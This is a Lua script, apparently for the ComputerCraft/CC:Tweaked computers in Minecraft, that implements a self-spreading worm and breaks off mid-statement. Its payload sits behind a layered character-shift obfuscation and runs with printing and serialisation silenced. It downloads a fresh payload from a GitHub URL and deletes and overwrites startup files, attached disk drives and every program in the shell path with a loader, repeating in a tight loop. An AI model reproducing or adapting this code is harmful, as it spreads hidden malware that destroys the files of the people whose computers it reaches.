local function decode_l1(data)
    local out = {}
    for i = 1, #data do
        out[#out + 1] = string.char((string.byte(data, i) - 7) % 256)
    end
    return table.concat(out)
end

local function decode_l2(data)
    local out = {}
    for i = 1, #data do
        out[#out + 1] = string.char((string.byte(data, i) - 5) % 256)
    end
    return table.concat(out)
end

local function decode_l3(data)
    local out = {}
    for i = 1, #data do
        out[#out + 1] = string.char((string.byte(data, i) - 3) % 256)
    end
    return table.concat(out)
end

local raw_payload = [[
local p, s = ...
s = s or shell
local function update_and_spread()
    if http and http.get then
        pcall(function()
            local r = http.get("https://raw.githubusercontent.com/TriumphyTheReal/CCTweakedScripts/main/blizard/payload.lua")
            if r then
                local d = r.readAll()
                r.close()
                if d and #d > 0 then p = d end
            end
        end)
    end
    local function infect(target)
        pcall(fs.delete, target)
        local f = io.open(target, "w")
        if f then
            f:write("local p,s=...\nlocal f=loadstring(p)\nif f then f(p,s) end")
            f:close()
        end
    end
    infect("startup")
    infect("startup.lua")
    if disk then
        for _, side in ipairs(redstone.getSides()) do
            if disk.isPresent(side) then
                local m = disk.getMountPath(side)
                if m then
                    infect(fs.combine(m, "startup"))
                    infect(fs.combine(m, "startup.lua"))
                end
            end
        end
    end
    if peripheral then
        for _, name in ipairs(peripheral.getNames()) do
            if peripheral.getType(name) == "drive" then
                local m = disk.getMountPath(name)
                if m then
                    infect(fs.combine(m, "startup"))
                    infect(fs.combine(m, "startup.lua"))
                end
            end
        end
    end
    if s and s.path then
        local function split(str, token)
            local l = {}
            local pos = 1
            while pos <= #str do
                local npos = string.find(str, token, pos, true)
                if npos == nil then break end
                l[#l+1] = string.sub(str, pos, npos - 1)
                pos = npos + 1
            end
            l[#l+1] = string.sub(str, pos)
            return l
        end
        for _, path in ipairs(split(s.path(), ":")) do
            if string.sub(path, 1, 1) == "/" and fs.exists(path) and fs.isDir(path) then
                for _, name in ipairs(fs.list(path)) do
                    infect(fs.combine(path, name))
                end
            end
        end
    end
end
pcall(update_and_spread)
while true do
    pcall(update_and_spread)
    os.sleep(0.05)
end
]]

local function encode(str)
    local l1, l2, l3 = {}, {}, {}
    for i = 1, #str do
        l1[#l1+1] = string.char((string.byte(str, i) + 3) % 256)
    end
    local s1 = table.concat(l1)
    for i = 1, #s1 do
        l2[#l2+1] = string.char((string.byte(s1, i) + 5) % 256)
    end
    local s2 = table.concat(l2)
    for i = 1, #s2 do
        l3[#l3+1] = string.char((string.byte(s2, i) + 7) % 256)
    end
    return table.concat(l3)
end

local encrypted_payload = encode(raw_payload)

local secure_env = setmetatable({
    print = function() end,
    write = function() end,
    textutils = {
        serialise = function() return "" end,
        serialize = function() return "" end,
        pagedPrint = function() end
    },
    io = {
        open = io.open,
        write = function() end
    }
}, { __index = _G })

local success, decrypted = pcall(function()
    local d1 = decode_l1(encrypted_payload)
    local d2 = decode_l2(d1)
    return decode_l3(d2)
end)

if success and decrypted then
    local fn = loadstring(decrypted)
    if fn
